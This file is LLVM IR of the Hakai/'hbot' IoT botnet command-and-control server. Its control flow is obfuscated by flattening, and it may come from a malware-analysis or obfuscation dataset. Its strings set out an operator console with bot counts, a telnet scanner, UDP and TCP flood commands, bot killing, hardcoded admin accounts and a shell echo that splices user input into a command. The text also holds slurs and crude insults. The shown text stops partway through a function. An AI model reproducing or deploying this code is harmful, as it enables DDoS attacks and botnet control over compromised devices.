; ModuleID = 'host/ir_fla/Hakai.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.clientdata_t = type { i32, [7 x i8], [512 x i8], i8 }
%struct.telnetdata_t = type { i32, i32, [20 x i8] }
%struct.name = type { [512 x i8], i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.account = type { [200 x i8], [200 x i8], [200 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@clients = common global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = common global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[1;31m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [45 x i8] c"\0D\0A\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.4 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.5 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"name:\00", align 1
@arra = internal global [40 x %struct.name] zeroinitializer, align 16
@.str.7 = private unnamed_addr constant [9 x i8] c".DSLKFJ\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"LOCKED \00", align 1
@fileFD = internal global %struct._IO_FILE* null, align 8
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"killed pid\00", align 1
@BOATSRAPED = internal global i32 0, align 4
@.str.12 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.13 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.14 = private unnamed_addr constant [6 x i8] c"\22%s\22\0A\00", align 1
@.str.108 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.15 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.17 = private unnamed_addr constant [15 x i8] c"[%d.%d.%d.%d]\0A\00", align 1
@.str.18 = private unnamed_addr constant [14 x i8] c"gethostbyname\00", align 1
@titleWriter.spinbuf = private unnamed_addr constant [4 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.22, i32 0, i32 0)], align 16
@.str.23 = private unnamed_addr constant [35 x i8] c"%c]0;%d Devices Connected %s  %s%c\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.20 = private unnamed_addr constant [2 x i8] c"\5C\00", align 1
@.str.21 = private unnamed_addr constant [2 x i8] c"|\00", align 1
@.str.22 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@managesConnected = internal global i32 0, align 4
@.str.24 = private unnamed_addr constant [6 x i8] c"admin\00", align 1
@.str.25 = private unnamed_addr constant [7 x i8] c"shadoh\00", align 1
@.str.26 = private unnamed_addr constant [6 x i8] c"!HBOT\00", align 1
@accounts = internal global [25 x %struct.account] zeroinitializer, align 16
@.str.27 = private unnamed_addr constant [9 x i8] c"%s %s %s\00", align 1
@.str.28 = private unnamed_addr constant [30 x i8] c"\1B[1;31mUsername\1B[1;36m:\1B[37m \00", align 1
@.str.30 = private unnamed_addr constant [15 x i8] c"connection.log\00", align 1
@.str.31 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.32 = private unnamed_addr constant [26 x i8] c"[LOGIN ATTEMPT] USER: %s\0A\00", align 1
@.str.33 = private unnamed_addr constant [30 x i8] c"\1B[1;31mPassword\1B[1;36m:\1B[37m \00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.35 = private unnamed_addr constant [27 x i8] c"[FAILED ATTEMPT] USER: %s\0A\00", align 1
@.str.36 = private unnamed_addr constant [15 x i8] c"\1B[1A\1B[2J\1B[1;1H\00", align 1
@.str.37 = private unnamed_addr constant [43 x i8] c"\1B[1;31m%s\1B[1;36m@\1B[1;31mhbot\1B[1;36m#: \1B[0m\00", align 1
@.str.29 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.38 = private unnamed_addr constant [5 x i8] c"bots\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"count\00", align 1
@.str.40 = private unnamed_addr constant [9 x i8] c"botcount\00", align 1
@.str.41 = private unnamed_addr constant [30 x i8] c"\1B[37;1m%s\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.42 = private unnamed_addr constant [33 x i8] c"\1B[37;1mtotal\1B[31;1m: \1B[37;1m%d\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [6 x i8] c"rape?\00", align 1
@.str.44 = private unnamed_addr constant [34 x i8] c"\1B[0mhbot.botkill: \1B[1;31m%d\1B[0m\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"resolve\00", align 1
@.str.46 = private unnamed_addr constant [2 x i8] c" \00", align 1
@.str.47 = private unnamed_addr constant [28 x i8] c"\1B[0mresolved [%s] to [%s]\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.49 = private unnamed_addr constant [37 x i8] c"\1B[0mddoscmds - shows ddos commands\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [36 x i8] c"servercmds - server side commands\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [29 x i8] c"admincmds - admin commands\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"servercmds\00", align 1
@.str.53 = private unnamed_addr constant [29 x i8] c"\1B[0mbots - shows bot count\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [29 x i8] c"exit - disconnect from net\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [28 x i8] c"help - displays help menu\0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [10 x i8] c"admincmds\00", align 1
@.str.57 = private unnamed_addr constant [51 x i8] c"\1B[0mbtype - shows architecture of bots connected\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [46 x i8] c"users - displays who's connected to the net\0D\0A\00", align 1
@.str.59 = private unnamed_addr constant [66 x i8] c"addusr - add users via server side (IN DEVELOPMENT! VERY BUGGY)\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [32 x i8] c"start - starts telnet scanner\0D\0A\00", align 1
@.str.61 = private unnamed_addr constant [39 x i8] c"kickuser - logs user out must be admin\00", align 1
@.str.62 = private unnamed_addr constant [41 x i8] c"You Must Be Admin to Use This Command!\0D\0A\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"ddoscmds\00", align 1
@.str.64 = private unnamed_addr constant [28 x i8] c"\1B[0mUDP ip port time size\0D\0A\00", align 1
@.str.65 = private unnamed_addr constant [24 x i8] c"TCP ip port time size\0D\0A\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.67 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"\1B[0m\00", align 1
@.str.69 = private unnamed_addr constant [16 x i8] c"Attack Sent! \0D\0A\00", align 1
@.str.70 = private unnamed_addr constant [12 x i8] c"actions.log\00", align 1
@.str.71 = private unnamed_addr constant [31 x i8] c"[hbot] [%s] [Sent an Attack!]\0A\00", align 1
@.str.72 = private unnamed_addr constant [5 x i8] c". KT\00", align 1
@.str.73 = private unnamed_addr constant [32 x i8] c"[hbot] [%s] [Killed All Pid's]\0A\00", align 1
@.str.74 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"users\00", align 1
@.str.76 = private unnamed_addr constant [39 x i8] c"\1B[31m- \1B[31mOnline Users \1B[31m-\1B[37m\0D\0A\00", align 1
@.str.77 = private unnamed_addr constant [37 x i8] c"\1B[37mID(\1B[31m%d\1B[37m) \1B[31m%s\1B[37m\0D\0A\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"kickuser\00", align 1
@.str.79 = private unnamed_addr constant [6 x i8] c"user=\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"USER=\00", align 1
@.str.81 = private unnamed_addr constant [2 x i8] c"=\00", align 1
@.str.82 = private unnamed_addr constant [43 x i8] c"\0A\1B[31mGoodbye, kicked by \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [30 x i8] c"\1B[33mKicked \1B[34m%s\1B[37m...\0D\0A\00", align 1
@.str.84 = private unnamed_addr constant [4 x i8] c"id=\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"ID=\00", align 1
@.str.86 = private unnamed_addr constant [46 x i8] c"\1B[33mKicked user with id of \1B[34m%d\1B[37m...\0D\0A\00", align 1
@.str.87 = private unnamed_addr constant [53 x i8] c"You Must Be big daddy shadoh to kick others, queer\0D\0A\00", align 1
@.str.88 = private unnamed_addr constant [8 x i8] c"adduser\00", align 1
@.str.89 = private unnamed_addr constant [24 x i8] c"echo '\0A%s' >> login.txt\00", align 1
@.str.90 = private unnamed_addr constant [33 x i8] c"[hbot] [%s] [added a user] [%s]\0A\00", align 1
@.str.91 = private unnamed_addr constant [5 x i8] c"exit\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"chat.log\00", align 1
@.str.94 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.95 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.96 = private unnamed_addr constant [26 x i8] c"[hbot] [Admin Connected] \00", align 1
@.str.97 = private unnamed_addr constant [39 x i8] c"[hbot] [Admin Connected] [%d.%d.%d.%d]\00", align 1
@.str.98 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.99 = private unnamed_addr constant [46 x i8] c"[hbot] Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.100 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.102 = private unnamed_addr constant [11 x i8] c"killer.txt\00", align 1
@kfileFD = internal global %struct._IO_FILE* null, align 8
@.str.103 = private unnamed_addr constant [31 x i8] c"[hbot] Lower Threading Count.\0A\00", align 1
@.str.104 = private unnamed_addr constant [33 x i8] c"[hbot] Socket Opened On Port %d\0A\00", align 1
@.str.105 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.107 = private unnamed_addr constant [5 x i8] c"hbot\00", align 1
@.str.109 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.110 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.111 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind uwtable
define i32 @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -1832471157, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1832471157, label %9
    i32 -684555758, label %13
    i32 1112043594, label %18
    i32 1349106424, label %27
    i32 1147151831, label %29
    i32 -1052061545, label %39
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 -684555758, i32 1349106424
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %7, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 1112043594, i32 1349106424
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 1349106424, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 1147151831, i32 -1052061545
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %8, align 4
  %37 = load i32, i32* %7, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %7, align 4
  store i32 -1832471157, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %8, align 4
  ret i32 %40

loopEnd:                                          ; preds = %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  %switchVar = alloca i32
  store i32 -137673050, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -137673050, label %10
    i32 -1166664444, label %26
    i32 -695488656, label %29
    i32 340066043, label %30
    i32 -655114753, label %35
    i32 -888150284, label %50
    i32 -876037851, label %52
    i32 113761027, label %55
    i32 17015012, label %57
    i32 -1069916927, label %62
    i32 1904235333, label %74
    i32 -1555154320, label %77
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = call i16** @__ctype_b_loc() #9
  %12 = load i16*, i16** %11, align 8
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i16, i16* %12, i64 %19
  %21 = load i16, i16* %20, align 2
  %22 = zext i16 %21 to i32
  %23 = and i32 %22, 8192
  %24 = icmp ne i32 %23, 0
  %25 = select i1 %24, i32 -1166664444, i32 -695488656
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32, i32* %4, align 4
  %28 = add nsw i32 %27, 1
  store i32 %28, i32* %4, align 4
  store i32 -137673050, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  store i32 340066043, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32, i32* %5, align 4
  %32 = load i32, i32* %4, align 4
  %33 = icmp sge i32 %31, %32
  %34 = select i1 %33, i32 -655114753, i32 -888150284
  store i32 %34, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = call i16** @__ctype_b_loc() #9
  %37 = load i16*, i16** %36, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i8, i8* %41, align 1
  %43 = sext i8 %42 to i32
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i16, i16* %37, i64 %44
  %46 = load i16, i16* %45, align 2
  %47 = zext i16 %46 to i32
  %48 = and i32 %47, 8192
  %49 = icmp ne i32 %48, 0
  store i32 -888150284, i32* %switchVar
  store i1 %49, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %51 = select i1 %.reload, i32 -876037851, i32 113761027
  store i32 %51, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = load i32, i32* %5, align 4
  %54 = add nsw i32 %53, -1
  store i32 %54, i32* %5, align 4
  store i32 340066043, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32, i32* %4, align 4
  store i32 %56, i32* %3, align 4
  store i32 17015012, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %3, align 4
  %59 = load i32, i32* %5, align 4
  %60 = icmp sle i32 %58, %59
  %61 = select i1 %60, i32 -1069916927, i32 -1555154320
  store i32 %61, i32* %switchVar
  br label %loopEnd

; <label>:62:                                     ; preds = %loopEntry
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = load i8*, i8** %2, align 8
  %69 = load i32, i32* %3, align 4
  %70 = load i32, i32* %4, align 4
  %71 = sub nsw i32 %69, %70
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %68, i64 %72
  store i8 %67, i8* %73, align 1
  store i32 1904235333, i32* %switchVar
  br label %loopEnd

; <label>:74:                                     ; preds = %loopEntry
  %75 = load i32, i32* %3, align 4
  %76 = add nsw i32 %75, 1
  store i32 %76, i32* %3, align 4
  store i32 17015012, i32* %switchVar
  br label %loopEnd

; <label>:77:                                     ; preds = %loopEntry
  %78 = load i8*, i8** %2, align 8
  %79 = load i32, i32* %3, align 4
  %80 = load i32, i32* %4, align 4
  %81 = sub nsw i32 %79, %80
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %78, i64 %82
  store i8 0, i8* %83, align 1
  ret void

loopEnd:                                          ; preds = %74, %62, %57, %55, %52, %50, %35, %30, %29, %26, %10, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readnone
declare i16** @__ctype_b_loc() #3

; Function Attrs: noinline nounwind uwtable
define void @broadcast(i8*, i32, i8*) #0 {
  %.reg2mem = alloca i32
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca [56 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca %struct.tm*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %14 = load i8*, i8** %4, align 8
  %15 = call i32 @strcmp(i8* %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i32 0, i32 0)) #8
  store i32 %15, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 157952826, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 157952826, label %first
    i32 1809651496, label %18
    i32 -1028113584, label %19
    i32 -1786497433, label %37
    i32 -170230016, label %41
    i32 528323011, label %46
    i32 1651907184, label %54
    i32 1463347427, label %58
    i32 82884738, label %66
    i32 -1526897030, label %67
    i32 -802476379, label %71
    i32 278547461, label %79
    i32 483357204, label %89
    i32 1276744764, label %105
    i32 -1064523676, label %113
    i32 2119697749, label %119
    i32 -330393194, label %122
    i32 -329422884, label %123
    i32 1569160875, label %126
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %16 = icmp eq i32 %.reload, 0
  %17 = select i1 %16, i32 1809651496, i32 -1028113584
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 0, i32* %7, align 4
  store i32 -1028113584, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8*, i8** %4, align 8
  %21 = call i64 @strlen(i8* %20) #8
  %22 = add i64 %21, 10
  %23 = call noalias i8* @malloc(i64 %22) #7
  store i8* %23, i8** %9, align 8
  %24 = load i8*, i8** %9, align 8
  %25 = load i8*, i8** %4, align 8
  %26 = call i64 @strlen(i8* %25) #8
  %27 = add i64 %26, 10
  call void @llvm.memset.p0i8.i64(i8* %24, i8 0, i64 %27, i32 1, i1 false)
  %28 = load i8*, i8** %9, align 8
  %29 = load i8*, i8** %4, align 8
  %30 = call i8* @strcpy(i8* %28, i8* %29) #7
  %31 = load i8*, i8** %9, align 8
  call void @trim(i8* %31)
  %32 = call i64 @time(i64* %10) #7
  %33 = call %struct.tm* @localtime(i64* %10) #7
  store %struct.tm* %33, %struct.tm** %11, align 8
  %34 = load %struct.tm*, %struct.tm** %11, align 8
  %35 = call i8* @asctime(%struct.tm* %34) #7
  store i8* %35, i8** %12, align 8
  %36 = load i8*, i8** %12, align 8
  call void @trim(i8* %36)
  store i32 0, i32* %13, align 4
  store i32 -1786497433, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %13, align 4
  %39 = icmp slt i32 %38, 1000000
  %40 = select i1 %39, i32 -170230016, i32 1569160875
  store i32 %40, i32* %switchVar
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = load i32, i32* %13, align 4
  %43 = load i32, i32* %5, align 4
  %44 = icmp eq i32 %42, %43
  %45 = select i1 %44, i32 82884738, i32 528323011
  store i32 %45, i32* %switchVar
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %47 = load i32, i32* %13, align 4
  %48 = sext i32 %47 to i64
  %49 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %48
  %50 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %49, i32 0, i32 3
  %51 = load i8, i8* %50, align 1
  %52 = icmp ne i8 %51, 0
  %53 = select i1 %52, i32 -1526897030, i32 1651907184
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  %55 = load i32, i32* %7, align 4
  %56 = icmp eq i32 %55, 0
  %57 = select i1 %56, i32 82884738, i32 1463347427
  store i32 %57, i32* %switchVar
  br label %loopEnd

; <label>:58:                                     ; preds = %loopEntry
  %59 = load i32, i32* %13, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %60
  %62 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %61, i32 0, i32 1
  %63 = load i32, i32* %62, align 4
  %64 = icmp ne i32 %63, 0
  %65 = select i1 %64, i32 -1526897030, i32 82884738
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  store i32 -329422884, i32* %switchVar
  br label %loopEnd

; <label>:67:                                     ; preds = %loopEntry
  %68 = load i32, i32* %7, align 4
  %69 = icmp ne i32 %68, 0
  %70 = select i1 %69, i32 -802476379, i32 483357204
  store i32 %70, i32* %switchVar
  br label %loopEnd

; <label>:71:                                     ; preds = %loopEntry
  %72 = load i32, i32* %13, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %73
  %75 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %74, i32 0, i32 1
  %76 = load i32, i32* %75, align 4
  %77 = icmp ne i32 %76, 0
  %78 = select i1 %77, i32 278547461, i32 483357204
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i32, i32* %13, align 4
  %81 = call i64 @send(i32 %80, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0), i64 7, i32 16384)
  %82 = load i32, i32* %13, align 4
  %83 = load i8*, i8** %6, align 8
  %84 = load i8*, i8** %6, align 8
  %85 = call i64 @strlen(i8* %84) #8
  %86 = call i64 @send(i32 %82, i8* %83, i64 %85, i32 16384)
  %87 = load i32, i32* %13, align 4
  %88 = call i64 @send(i32 %87, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i32 0, i32 0), i64 2, i32 16384)
  store i32 483357204, i32* %switchVar
  br label %loopEnd

; <label>:89:                                     ; preds = %loopEntry
  %90 = load i32, i32* %13, align 4
  %91 = load i8*, i8** %4, align 8
  %92 = load i8*, i8** %4, align 8
  %93 = call i64 @strlen(i8* %92) #8
  %94 = call i64 @send(i32 %90, i8* %91, i64 %93, i32 16384)
  %95 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %96 = load i32, i32* %13, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %97
  %99 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %98, i32 0, i32 2
  %100 = getelementptr inbounds [20 x i8], [20 x i8]* %99, i32 0, i32 0
  %101 = call i32 (i8*, i8*, ...) @sprintf(i8* %95, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i32 0, i32 0), i8* %100) #7
  %102 = load i32, i32* %7, align 4
  %103 = icmp ne i32 %102, 0
  %104 = select i1 %103, i32 1276744764, i32 2119697749
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %13, align 4
  %107 = sext i32 %106 to i64
  %108 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %107
  %109 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %108, i32 0, i32 1
  %110 = load i32, i32* %109, align 4
  %111 = icmp ne i32 %110, 0
  %112 = select i1 %111, i32 -1064523676, i32 2119697749
  store i32 %112, i32* %switchVar
  br label %loopEnd

; <label>:113:                                    ; preds = %loopEntry
  %114 = load i32, i32* %13, align 4
  %115 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %116 = getelementptr inbounds [56 x i8], [56 x i8]* %8, i32 0, i32 0
  %117 = call i64 @strlen(i8* %116) #8
  %118 = call i64 @send(i32 %114, i8* %115, i64 %117, i32 16384)
  store i32 -330393194, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %13, align 4
  %121 = call i64 @send(i32 %120, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i64 1, i32 16384)
  store i32 -330393194, i32* %switchVar
  br label %loopEnd

; <label>:122:                                    ; preds = %loopEntry
  store i32 -329422884, i32* %switchVar
  br label %loopEnd

; <label>:123:                                    ; preds = %loopEntry
  %124 = load i32, i32* %13, align 4
  %125 = add nsw i32 %124, 1
  store i32 %125, i32* %13, align 4
  store i32 -1786497433, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = load i8*, i8** %9, align 8
  call void @free(i8* %127) #7
  ret void

